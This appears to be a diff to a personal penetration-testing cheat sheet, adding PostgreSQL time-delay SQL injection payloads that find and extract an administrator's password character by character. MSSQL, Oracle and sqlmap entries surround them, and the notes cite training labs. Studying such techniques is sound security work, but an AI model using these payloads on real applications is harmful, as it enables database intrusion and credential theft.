@@ -1143,7 +1143,7 @@ select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
 # Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)
 TrackingId =u5YD3PapBcR4lN3e7Tj4' AND '1'='1    #Test w/ a condition based injection (True or False)
 
-' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs
+' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs (Time Delay based)
 
 ' IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--  #This query uses Boolean to guess the table name of a database
 
@@ -1159,6 +1159,18 @@ TrackingId =u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHER
 
 # Blind Oracle sqli (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
  TrackingId=Vqg7K1mFWH8hNMMb'||(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username%3d+'administrator')||'  # Used Burp Cluster bomb to iterate through the length of the password and simplelist.
+
+ #Time-Delay SQLi
+
+ TrackingId=jSeXZLJoesz7M9ZH'||pg_sleep(10)--   #The key here is to conactenat the normal query w/ the sleep payload as it is generally processed synchronously by the application.
+
+TrackingId='%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--   # Validate the payload still works for the delay.
+
+TrackingId='%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; # Check for 'administrator' in the 'users' table
+
+TrackingId='%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password) >19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  # Check length of PW.
+
+TrackingId='%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  #Use Sniper to retrieve PW.
 
 # Post
 ./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
